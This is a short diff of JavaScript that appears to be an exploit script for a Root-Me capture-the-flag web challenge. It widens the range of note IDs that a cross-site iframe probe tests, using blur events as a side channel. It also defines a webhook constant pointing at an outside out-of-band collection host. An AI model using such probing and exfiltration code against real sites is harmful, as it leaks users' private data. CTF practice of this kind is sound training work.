@@ -3,9 +3,9 @@ const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
 const WEBHOOK = "https://85531c6a18bfcfaeb4aegux4iseyyyyyb.oast.pro";
 
 window.onload = function () {
-    let i = 1350;
+    let i = 0;
     function testNext() {
-        if (i > 1360) return;
+        if (i > 1000) return;
         let blurFired = false;
         window.addEventListener("blur", () => { blurFired = true; });
         const iframe = document.createElement("iframe");
